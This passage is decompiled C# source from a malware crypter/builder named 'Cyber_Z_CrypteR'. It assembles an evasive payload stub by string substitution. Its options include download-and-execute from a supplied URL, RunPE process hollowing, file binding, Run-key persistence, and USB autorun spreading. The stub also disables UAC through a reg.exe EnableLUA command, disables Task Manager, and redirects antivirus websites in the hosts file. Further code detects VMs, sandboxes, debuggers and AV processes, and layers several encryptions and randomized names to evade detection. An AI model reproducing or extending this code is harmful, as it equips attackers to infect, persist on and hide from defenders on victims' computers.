                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Disable View Hide Files";
                }
                flag6 = !MyProject.Forms.U_S_G.DisableTask.Checked;
                if (flag6)
                {
                    s12 = s12.Replace("Dim DisableTaskK As New Threading.Thread(AddressOf CyberZ_Options.DisableTaskMnGR)", "");
                    s12 = s12.Replace("DisableTaskK.Start()", "");
                }
                else
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Disable TaskMananger\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Disable TaskMananger";
                }
                flag6 = !MyProject.Forms.U_S_G.UACheck.Checked;
                if (flag6)
                    s12 = s12.Replace("CyberZ_Options.UACCCCJAJ()", "");
                flag6 = MyProject.Forms.U_S_G.CheckBox5.Checked;
                if (flag6)
                {
                    flag7 = MyProject.Forms.U_S_G.RadioButton18.Checked;
                    if (flag7)
                        s12 = s12.Replace("FakeErrorMessage() ' Start", "");
                    flag7 = MyProject.Forms.U_S_G.RadioButton22.Checked;
                    if (flag7)
                        s12 = s12.Replace("FakeErrorMessage() ' End", "");
                    s12 = s12.Replace("czghxjgnutton", Conversions.ToString(U_S_G.Buttona));
                    s12 = s12.Replace("czghxjgicon", Conversions.ToString(U_S_G.Icona));
                    flag7 = MyProject.Forms.U_S_G.RadioButton12.Checked;
                    if (flag7)
                    {
                        s12 = s12.Replace("BodyofMessage", "Application Error");
                        s12 = s12.Replace("\"TitleofMessage\"", "\"Run-Time error: '9' \"& vbNewLine & \"Subscript out of range\"");
                    }
                    else
                    {
                        flag7 = MyProject.Forms.U_S_G.RadioButton23.Checked;
                        if (flag7)
                        {
                            s12 = s12.Replace("BodyofMessage", "Error!");
                            s12 = s12.Replace("\"TitleofMessage\"", "\"Failed to initialize properly \"& vbNewLine & \"(0xc0000142)\"");
                        }
                        else
                        {
                            s12 = s12.Replace("TitleofMessage", MyProject.Forms.U_S_G.TextBox16.Text);
                            s12 = s12.Replace("BodyofMessage", MyProject.Forms.U_S_G.TextBox17.Text);
                        }
                    }
                }
                else
                {
                    s12 = s12.Replace("FakeErrorMessage() ' Start", "");
                    s12 = s12.Replace("FakeErrorMessage() ' End", "");
                }
                flag7 = !MyProject.Forms.U_S_G.CheckMelt.Checked;
                if (flag7)
                    s12 = s12.Replace("MeltFile.MeltFile()", "");
                switch (MyProject.Forms.U_S_G.Down_ExCheck.Checked)
                {
                    case 0:
                        s12 = s12.Replace("\"http://yourwebsite.com/file.extencion\"", "");
                        s12 = s12.Replace("Cyber_ZDownloader.Down_Exec()", "");
                        break;

                    case 1:
                        s12 = s12.Replace("http://yourwebsite.com/file.extencion", MyProject.Forms.U_S_G.Url_Downloader_Text.Text);
                        bool flag2 = MyProject.Forms.U_S_G.RadioButton25.Checked;
                        flag7 = flag2;
                        if (flag7)
                            s12 = s12.Replace("(Environment.GetFolderPath(SpecialFolder.ApplicationData) & \"\"\\\"\" & \"\"J8sOnKlo.exe\"\")", "(tempFolder) & \"\"\\\"\" & \"\"J8sOnKlo.exe\"\"");
                        MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Download & Execute From {" + MyProject.Forms.U_S_G.Url_Downloader_Text.Text + "}\u2022");
                        MyProject.Forms.Work_Progress.Current_Operation.Text = "Download & Execute From {" + MyProject.Forms.U_S_G.Url_Downloader_Text.Text + "}";
                        break;
                }
                s12 = s12.Replace("keyforde_cryption", Cyber_Z_CrypteR.PolyCrypt.Encrypt(s6));
                string s5 = Cyber_Z_CrypteR.random_key(100);
                string s9 = Cyber_Z_CrypteR.random_key(10);
                string s1 = Cyber_Z_CrypteR.random_key(10);
                resourceWriter10 = new ResourceWriter(Application.StartupPath + "\\" + s5 + ".resources");
                try
                {
                    resourceWriter10.AddResource(s5, Cyber_Z_CrypteR.pr0t0x0r.encrypt(Resources.tiny, s6));
                    resourceWriter10.AddResource(s9, Cyber_Z_CrypteR.pr0t0x0r.encrypt(Resources.Self_Inject, s6));
                    flag7 = MyProject.Forms.U_S_G.BinderCheck.Checked;
                    if (flag7)
                    {
                        MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "Binding");
                        MyProject.Forms.Work_Progress.Current_Operation.Text = "Binding";
                        resourceWriter10.AddResource(s1, Cyber_Z_CrypteR.pr0t0x0r.encrypt(File.ReadAllBytes(MyProject.Forms.U_S_G.TextBox8.Text), s6));
                        s12 = s12.Replace("StartupLoaderHere", Convert.ToBase64String(Resources.Do_The_Rest));
                        s12 = s12.Replace("BindedResXinresX", s1);
                    }
                    else
                    {
                        s12 = s12.Replace("Dim BindedResX = Pr0t0XorDecrypt(DirectCast(newresourcemananger.GetObject(\"BindedResXinresX\"), Byte()), Smi_PolyKEy)", "");
                        s12 = s12.Replace("InvokeIt(Assembly.Load(RunPeInResX), \"WindowsApplication2.rp2\", \"strangething\", New Object() {BindedResX, placedropadaaa, Application.ExecutablePath})", "");
                    }
                    resourceWriter10.Generate();
                }
                finally
                {
                    flag7 = resourceWriter10 != null;
                    if (flag7)
                        resourceWriter10.Dispose();
                }
                s12 = s12.Replace("LoaderResZxName", Cyber_Z_CrypteR.PolyCrypt.Encrypt(s5));
                s12 = s12.Replace("RunPEINResX", s9);
                Check_Antis();
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022U.S.G\u2022");
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Auto - U.S.G";
                s12 = s12.Replace("Kernel32ParaEncryptar", Cyber_Z_CrypteR.PolyCrypt.Encrypt("kernel32"));
                s12 = s12.Replace("GetModuleFileNameParaDe_cryptar", Cyber_Z_CrypteR.PolyCrypt.Encrypt("GetModuleFileNameA"));
                s12 = s12.Replace("MoveFileExParaDe_cryptar", Cyber_Z_CrypteR.PolyCrypt.Encrypt("MoveFileExW"));
                s12 = s12.Replace("ExitProcessParaDe_cryptar", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ExitProcess"));
                s12 = s12.Replace("GetModuleFileNameR", Cyber_Z_CrypteR.random_key(300));
                s12 = s12.Replace("ExitProcessRR", Cyber_Z_CrypteR.random_key(300));
                s12 = s12.Replace("MoveFileExWWZY", Cyber_Z_CrypteR.random_key(300));
                s12 = s12.Replace("MoveFileiZZ", Cyber_Z_CrypteR.random_key(300));
                s12 = s12.Replace("CreateProcessA", Cyber_Z_CrypteR.PolyCrypt.Encrypt("CreateProcessA"));
                s12 = s12.Replace("GetThreadContext", Cyber_Z_CrypteR.PolyCrypt.Encrypt("GetThreadContext"));
                s12 = s12.Replace("ReadProcessMemory", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ReadProcessMemory"));
                s12 = s12.Replace("ResumeThread", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ResumeThread"));
                s12 = s12.Replace("SetThreadContext", Cyber_Z_CrypteR.PolyCrypt.Encrypt("SetThreadContext"));
                s12 = s12.Replace("VirtualAllocEx", Cyber_Z_CrypteR.PolyCrypt.Encrypt("VirtualAllocEx"));
                s12 = s12.Replace("WriteProcessMemory", Cyber_Z_CrypteR.PolyCrypt.Encrypt("WriteProcessMemory"));
                s12 = s12.Replace("ZwUnmapViewOfSection", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ZwUnmapViewOfSection"));
                s12 = s12.Replace("kernel322", Cyber_Z_CrypteR.PolyCrypt.Encrypt("kernel32"));
                s12 = s12.Replace("ntdll2", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ntdll"));
                s12 = s12.Replace("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Cyber_Z_CrypteR.PolyCrypt.Encrypt("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
                s12 = s12.Replace("will decrypt one .exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt(".exe"));
                s12 = s12.Replace("\\Microsoft\\Windows\\", Cyber_Z_CrypteR.PolyCrypt.Encrypt("\\Microsoft\\Windows\\"));
                s12 = s12.Replace("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", Cyber_Z_CrypteR.PolyCrypt.Encrypt("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"));
                s12 = s12.Replace("HiddenAtribute", Cyber_Z_CrypteR.PolyCrypt.Encrypt("Hidden"));
                s12 = s12.Replace("USB Security 3.0.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("USB Security 3.0.exe"));
                s12 = s12.Replace("autorun.inf", Cyber_Z_CrypteR.PolyCrypt.Encrypt("autorun.inf"));
                s12 = s12.Replace("[autorun]", Cyber_Z_CrypteR.PolyCrypt.Encrypt("[autorun]"));
                s12 = s12.Replace("open=", Cyber_Z_CrypteR.PolyCrypt.Encrypt("open="));
                s12 = s12.Replace("shellexecute=", Cyber_Z_CrypteR.PolyCrypt.Encrypt("shellexecute="));
                s12 = s12.Replace("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", Cyber_Z_CrypteR.PolyCrypt.Encrypt("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"));
                s12 = s12.Replace("SSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", Cyber_Z_CrypteR.PolyCrypt.Encrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
                s12 = s12.Replace("EnableLUA", Cyber_Z_CrypteR.PolyCrypt.Encrypt("EnableLUA"));
                s12 = s12.Replace("\\drivers\\etc\\hosts", Cyber_Z_CrypteR.PolyCrypt.Encrypt("\\drivers\\etc\\hosts"));
                s12 = s12.Replace("127.0.0.1 www.virustotal.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.virustotal.com"));
                s12 = s12.Replace("127.0.0.1 virustotal.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 virustotal.com"));
                s12 = s12.Replace("127.0.0.1 novirusthanks.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 novirusthanks.org"));
                s12 = s12.Replace("127.0.0.1 vscan.novirusthanks.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 vscan.novirusthanks.org"));
                s12 = s12.Replace("127.0.0.1 virusscan.jotti.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 virusscan.jotti.org"));
                s12 = s12.Replace("127.0.0.1 www.virusscan.jotti.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.virusscan.jotti.org"));
                s12 = s12.Replace("127.0.0.1 virscan.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 virscan.org"));
                s12 = s12.Replace("127.0.0.1 www.virscan.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.virscan.org"));
                s12 = s12.Replace("127.0.0.1 virus-trap.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 virus-trap.org"));
                s12 = s12.Replace("127.0.0.1 www.virus-trap.org", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.virus-trap.org"));
                s12 = s12.Replace("127.0.0.1 filterbit.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 filterbit.com"));
                s12 = s12.Replace("127.0.0.1 www.filterbit.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.filterbit.com"));
                s12 = s12.Replace("127.0.0.1 viruschief.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 viruschief.com"));
                s12 = s12.Replace("127.0.0.1 www.viruschief.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.viruschief.com"));
                s12 = s12.Replace("127.0.0.1 kaspersky.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 kaspersky.com"));
                s12 = s12.Replace("127.0.0.1 www.kaspersky.com", Cyber_Z_CrypteR.PolyCrypt.Encrypt("127.0.0.1 www.kaspersky.com"));
                s12 = s12.Replace("Anti's Function Is here", Cyber_Z_CrypteR.PolyCrypt.Encrypt(""));
                s12 = s12.Replace("VirtualBox Graphics Adapter", Cyber_Z_CrypteR.PolyCrypt.Encrypt("VirtualBox Graphics Adapter"));
                s12 = s12.Replace("VMware SVGA II", Cyber_Z_CrypteR.PolyCrypt.Encrypt("VMware SVGA II"));
                s12 = s12.Replace("winmgmts:", Cyber_Z_CrypteR.PolyCrypt.Encrypt("winmgmts:"));
                s12 = s12.Replace("taskmgr.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("taskmgr.exe"));
                s12 = s12.Replace("mcagent", Cyber_Z_CrypteR.PolyCrypt.Encrypt("mcagent"));
                s12 = s12.Replace("mcuimgr", Cyber_Z_CrypteR.PolyCrypt.Encrypt("mcuimgr"));
                s12 = s12.Replace("avgemc", Cyber_Z_CrypteR.PolyCrypt.Encrypt("avgemc"));
                s12 = s12.Replace("a2servic", Cyber_Z_CrypteR.PolyCrypt.Encrypt("a2servic"));
                s12 = s12.Replace("ashWebSv", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ashWebSv"));
                s12 = s12.Replace("clamauto", Cyber_Z_CrypteR.PolyCrypt.Encrypt("clamauto"));
                s12 = s12.Replace("cpffffffffffffffffff", Cyber_Z_CrypteR.PolyCrypt.Encrypt("cpf"));
                s12 = s12.Replace("ewidowwwwwwww", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ewido"));
                s12 = s12.Replace("FPAVServer", Cyber_Z_CrypteR.PolyCrypt.Encrypt("FPAVServer"));
                s12 = s12.Replace("BullGuarddddddddddd", Cyber_Z_CrypteR.PolyCrypt.Encrypt("BullGuard"));
                s12 = s12.Replace("antigennnnnnnnn", Cyber_Z_CrypteR.PolyCrypt.Encrypt("antigen"));
                s12 = s12.Replace("ccapp", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ccapp"));
                s12 = s12.Replace("tmlisten", Cyber_Z_CrypteR.PolyCrypt.Encrypt("tmlisten"));
                s12 = s12.Replace("pccntmon", Cyber_Z_CrypteR.PolyCrypt.Encrypt("pccntmon"));
                s12 = s12.Replace("earthagent", Cyber_Z_CrypteR.PolyCrypt.Encrypt("earthagent"));
                s12 = s12.Replace("spysweeperrrrrr", Cyber_Z_CrypteR.PolyCrypt.Encrypt("spysweeper"));
                s12 = s12.Replace("vpcmap", Cyber_Z_CrypteR.PolyCrypt.Encrypt("vpcmap"));
                s12 = s12.Replace("vmsrvc", Cyber_Z_CrypteR.PolyCrypt.Encrypt("vmsrvc"));
                s12 = s12.Replace("acs.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("acs.exe"));
                s12 = s12.Replace("apache.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("apache.exe"));
                s12 = s12.Replace("bm38sp5.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("bm38sp5.exe"));
                s12 = s12.Replace("vone.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt("vone.exe"));
                s12 = s12.Replace("SbieSvc", Cyber_Z_CrypteR.PolyCrypt.Encrypt("SbieSvc"));
                s12 = s12.Replace("sampleeee", Cyber_Z_CrypteR.PolyCrypt.Encrypt("sample"));
                s12 = s12.Replace("ollydbgggg", Cyber_Z_CrypteR.PolyCrypt.Encrypt("ollydbg"));
                s12 = s12.Replace("wiresharkkkkk", Cyber_Z_CrypteR.PolyCrypt.Encrypt("wireshark"));
                s12 = s12.Replace("mbammmmmmmmmm", Cyber_Z_CrypteR.PolyCrypt.Encrypt("mbam"));
                s12 = s12.Replace("SELECT * FROM Win32_VideoController", Cyber_Z_CrypteR.PolyCrypt.Encrypt("SELECT * FROM Win32_VideoController"));
                s12 = s12.Replace("MSASCui", Cyber_Z_CrypteR.PolyCrypt.Encrypt("MSASCui"));
                s12 = s12.Replace("msmpeng", Cyber_Z_CrypteR.PolyCrypt.Encrypt("msmpeng"));
                Check_Antis();
                s12 = s12.Replace("windirrr", Cyber_Z_CrypteR.PolyCrypt.Encrypt("windir"));
                s12 = s12.Replace("appdatavariabletodecrypt", Cyber_Z_CrypteR.PolyCrypt.Encrypt("appdata"));
                s12 = s12.Replace("tempvariabletodecrypt", Cyber_Z_CrypteR.PolyCrypt.Encrypt("temp"));
                s12 = s12.Replace("LocalAppdataPathTpEncrypt", Cyber_Z_CrypteR.PolyCrypt.Encrypt("LocalAppdata"));
                s12 = s12.Replace("HOMEPATHToEncryptMyDC", Cyber_Z_CrypteR.PolyCrypt.Encrypt("HOMEPATH"));
                s12 = s12.Replace("PROGRAMFILEStoEncryptpCrypt", Cyber_Z_CrypteR.PolyCrypt.Encrypt("PROGRAMFILES"));
                s12 = s12.Replace("000000000", Cyber_Z_CrypteR.PolyCrypt.Encrypt("0"));
                s12 = s12.Replace("\\tmpG", Cyber_Z_CrypteR.PolyCrypt.Encrypt("\\tmpG"));
                s12 = s12.Replace(".tmpppp", Cyber_Z_CrypteR.PolyCrypt.Encrypt(".tmp"));
                s12 = s12.Replace("WillDecrypt an |", Cyber_Z_CrypteR.PolyCrypt.Encrypt("|"));
                s12 = s12.Replace("Will Decrypt An \\", Cyber_Z_CrypteR.PolyCrypt.Encrypt("\\"));
                string s11 = Resources.StubZ;
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Compiling Data\u2022");
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Compiling Data";
                iCompiler.GenerateExe(Application.StartupPath + "\\nameofrunpedll", s12, "", s13, s5);
                File.Delete(Application.StartupPath + "\\" + s5 + ".resources");
                File.Delete(Application.StartupPath + "\\" + s13 + ".resources");
                string s10 = Resources.Encryptions;
                s10 = s10.Replace("MyPolymorphicPassword", s6);
                bool flag3 = MyProject.Forms.U_S_G.TripleDEES.Checked;
                flag7 = flag3;
                if (flag7)
                    s10 = s10.Replace("Securer.TripleDES", "Securer.TripleDES");
                bool flag4 = MyProject.Forms.U_S_G.PolyCryptEncryption.Checked;
                flag7 = flag4;
                if (flag7)
                    s10 = s10.Replace("Securer.TripleDES", "Securer.DES");
                bool flag5 = MyProject.Forms.U_S_G.PolyCloud.Checked;
                flag7 = flag5;
                if (flag7)
                    s10 = s10.Replace("Securer.TripleDES", "Securer.RC2");
                iCompiler.GenerateExe(Application.StartupPath + "\\EncryptionsResX", s10, "", null, null);
                Check_Antis();
                bArr18 = File.ReadAllBytes(Application.StartupPath + "\\EncryptionsResX.dll");
                byte[] bArr2 = Cyber_Z_CrypteR.PolyMorphicStairs.PolyCrypt(ref bArr18, Encoding.GetEncoding(1250).GetBytes(s6), 0);
                File.Delete(Application.StartupPath + "\\EncryptionsResX.dll");
                resourceWriter11 = new ResourceWriter("EncryptionsResX.resources");
                try
                {
                    resourceWriter11.AddResource("EncryptionsResX", bArr2);
                    resourceWriter11.Generate();
                }
                finally
                {
                    flag7 = resourceWriter11 != null;
                    if (flag7)
                        resourceWriter11.Dispose();
                }
                string s4 = Application.StartupPath + "\\nameofrunpedll.dll";
                flag7 = MyProject.Forms.U_S_G.POlyXORV2.Checked;
                if (flag7)
                {
                    bArr1 = Cyber_Z_CrypteR.BabyPolyCrypt.EncrytPoly(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6));
                    s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("BabyCrypt"));
                    s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("DecryptPoly"));
                }
                else
                {
                    flag7 = MyProject.Forms.U_S_G.PolyStairs.Checked;
                    if (flag7)
                    {
                        bArr18 = File.ReadAllBytes(s4);
                        bArr1 = Cyber_Z_CrypteR.PolyMorphicStairs.PolyCrypt(ref bArr18, Encoding.GetEncoding(1250).GetBytes(s6), 0);
                        s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("PolyMorphicStairs"));
                        s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("PolyDeCryptStairs"));
                    }
                    else
                    {
                        flag7 = MyProject.Forms.U_S_G.TripleDEES.Checked;
                        if (flag7)
                        {
                            bArr1 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6), Cyber_Z_CrypteR.Guard.Securer.TripleDES);
                            s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("GuardER"));
                            s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("UnsecuringIT"));
                        }
                        else
                        {
                            flag7 = MyProject.Forms.U_S_G.CheckXOR.Checked;
                            if (flag7)
                            {
                                bArr1 = Cyber_Z_CrypteR.pr0t0x0r.encrypt(File.ReadAllBytes(s4), s6);
                                s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("Pr0t0x0r"));
                                s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("Pr0t0XorDecrypt"));
                            }
                            else
                            {
                                flag7 = MyProject.Forms.U_S_G.RC4.Checked;
                                if (flag7)
                                {
                                    bArr1 = Proper_RC4(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6));
                                    s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("InvRC4"));
                                    s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("Proper_RC4"));
                                }
                                else
                                {
                                    flag7 = MyProject.Forms.U_S_G.Stairs.Checked;
                                    if (flag7)
                                    {
                                        bArr1 = Cyber_Z_CrypteR.StairsEncryption.Crypt(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6));
                                        s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("StairsNormalEncryption"));
                                        s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("DeCryptWithNormala"));
                                    }
                                    else
                                    {
                                        flag7 = MyProject.Forms.U_S_G.Check3DES.Checked;
                                        if (flag7)
                                        {
                                            bArr1 = Cyber_Z_CrypteR.MD5.Encrypt(File.ReadAllBytes(s4), s6, CipherMode.ECB, PaddingMode.PKCS7);
                                            s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("MD55555"));
                                            s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("DecryptbyMDD"));
                                        }
                                        else
                                        {
                                            flag7 = MyProject.Forms.U_S_G.PolyCloud.Checked;
                                            if (flag7)
                                            {
                                                bArr1 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6), Cyber_Z_CrypteR.Guard.Securer.RC2);
                                                s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("GuardER"));
                                                s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("UnsecuringIT"));
                                            }
                                            else
                                            {
                                                flag7 = MyProject.Forms.U_S_G.PolyCryptEncryption.Checked;
                                                if (flag7)
                                                {
                                                    bArr1 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(s4), Encoding.GetEncoding(1250).GetBytes(s6), Cyber_Z_CrypteR.Guard.Securer.DES);
                                                    s11 = s11.Replace("\"PolyMorphicStairs\"", string2char("GuardER"));
                                                    s11 = s11.Replace("\"PolyDeCryptStairs\"", string2char("UnsecuringIT"));
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                resourceWriter12 = new ResourceWriter("nameofrunpedll.resources");
                try
                {
                    resourceWriter12.AddResource("nameofrunpedll", bArr1);
                    resourceWriter12.Generate();
                }
                finally
                {
                    flag7 = resourceWriter12 != null;
                    if (flag7)
                        resourceWriter12.Dispose();
                }
                File.Delete(Application.StartupPath + "\\nameofrunpedll.dll");
                s11 = s11.Replace("\"nameofrunpedll\"", string2char("nameofrunpedll"));
                s11 = s11.Replace("\"EncryptionsResX\"", string2char("EncryptionsResX"));
                s11 = s11.Replace("\"MainClass\"", string2char("MainClass"));
                s11 = s11.Replace("\"MainS\"", string2char("Main"));
                s11 = s11.Replace("\"MyPolymorphicPassword\"", string2char(s6));
                string s7 = Cyber_Z_CrypteR.random_key(10);
                string s8 = Cyber_Z_CrypteR.random_key(10);
                iCompilerExe.GenExecutable(false, Application.StartupPath + "\\" + s7, s11, "", "nameofrunpedll.resources", "EncryptionsResX.resources");
                File.Delete(Application.StartupPath + "\\EncryptionsResX.resources");
                File.Delete(Application.StartupPath + "\\nameofrunpedll.resources");
                string s2 = Encoding.Default.GetString(Cyber_Z_CrypteR.PolyRevCrypt.PolyRevCrypt(File.ReadAllBytes(Application.StartupPath + "\\" + s7 + ".dll"), s6, false));
                resourceWriter13 = new ResourceWriter(s7 + ".resources");
                try
                {
                    resourceWriter13.AddResource(s7, s2);
                    string s14 = Resources.PolyCrypt;
                    s14 = s14.Replace("MyPolymorphicPassword", s6);
                    resourceWriter13.AddResource(s8, Cyber_Z_CrypteR.PolyCrypt.Encrypt(s14));
                    resourceWriter13.Generate();
                }
                finally
                {
                    flag7 = resourceWriter13 != null;
                    if (flag7)
                        resourceWriter13.Dispose();
                }
                File.Delete(Application.StartupPath + "\\" + s7 + ".dll");
                string s3 = Resources.Main__CRz;
                s3 = s3.Replace("\"This_Main\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("This_Main")));
                s3 = s3.Replace("\"MainS\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("Main")));
                s3 = s3.Replace("\"nameofres\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt(s7)));
                s3 = s3.Replace("\"nameofencres\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt(s8)));
                s3 = s3.Replace("\"PolyCrypt\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("PolyCrypt")));
                s3 = s3.Replace("\"PolyRevDeCrypt\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("PolyRevDeCrypt")));
                s3 = s3.Replace("\"System.dll\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("System.dll")));
                s3 = s3.Replace("\"System.Management.dll\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("System.Management.dll")));
                s3 = s3.Replace("\"System.Data.dll\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("System.Data.dll")));
                s3 = s3.Replace("\"System.Windows.Forms.dll\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("System.Windows.Forms.dll")));
                s3 = s3.Replace("\"/platform:x86\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("/platform:x86")));
                s3 = s3.Replace("\"VisualBasicc\"", string2char(Cyber_Z_CrypteR.PolyCrypt.Encrypt("VisualBasic")));
                s3 = s3.Replace("resourceremManager", UnicodeGen(99, true));
                s3 = s3.Replace("BASE64_Decode", UnicodeGen(99, true));
                s3 = s3.Replace("enccry", UnicodeGen(99, true));
                s3 = s3.Replace("OwnZ", UnicodeGen(99, true));
                s3 = s3.Replace("flagss", UnicodeGen(99, true));
                s3 = s3.Replace("_type_", UnicodeGen(99, true));
                s3 = s3.Replace("_methood_", UnicodeGen(99, true));
                s3 = s3.Replace("TheCompiledFile", UnicodeGen(99, true));
                s3 = s3.Replace("_Class_", UnicodeGen(99, true));
                s3 = s3.Replace("_Method_", UnicodeGen(99, true));
                s3 = s3.Replace("Parameters_Object", UnicodeGen(99, true));
                s3 = s3.Replace("Dynamic_Compiler", UnicodeGen(99, true));
                s3 = s3.Replace("Source_As_String", UnicodeGen(99, true));
                s3 = s3.Replace("options_Param", UnicodeGen(99, true));
                s3 = s3.Replace("provider_codedom", UnicodeGen(99, true));
                s3 = s3.Replace("resultscompiler", UnicodeGen(99, true));
                flag7 = MyProject.Forms.U_S_G.CheckBox3.Checked;
                if (flag7)
                    s3 = s3.Replace("Imports Microsoft.CSharp", "");
                flag7 = MyProject.Forms.U_S_G.CheckBox1.Checked;
                if (flag7)
                {
                    string s15 = Resources.Assembly_Info;
                    s15 = s15.Replace("title", MyProject.Forms.U_S_G.TextBox2.Text);
                    s15 = s15.Replace("description", MyProject.Forms.U_S_G.TextBox5.Text);
                    s15 = s15.Replace("company", MyProject.Forms.U_S_G.TextBox4.Text);
                    s15 = s15.Replace("product", MyProject.Forms.U_S_G.TextBox7.Text);
                    s15 = s15.Replace("copyrights", MyProject.Forms.U_S_G.TextBox3.Text);
                    s15 = s15.Replace("assVersion", Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown9.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown2.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown4.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown3.Value));
                    s15 = s15.Replace("assFileVersion", Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown5.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown6.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown7.Value) + "." + Conversions.ToString(MyProject.Forms.U_S_G.NumericUpDown8.Value));
                    s3 = s3.Replace("Imports Microsoft.CSharp", s15);
                }
                else
                {
                    flag7 = !MyProject.Forms.U_S_G.CheckBox3.Checked & !CheckBox9.Checked;
                    if (flag7)
                    {
                        string s16 = Resources.Assembly_Info;
                        s16 = s16.Replace("title", "");
                        s16 = s16.Replace("description", "");
                        s16 = s16.Replace("company", "");
                        s16 = s16.Replace("product", "");
                        s16 = s16.Replace("copyrights", "");
                        s16 = s16.Replace("assVersion", "1.0.0.0");
                        s16 = s16.Replace("assFileVersion", "1.0.0.0");
                        s3 = s3.Replace("Imports Microsoft.CSharp", s16);
                    }
                }
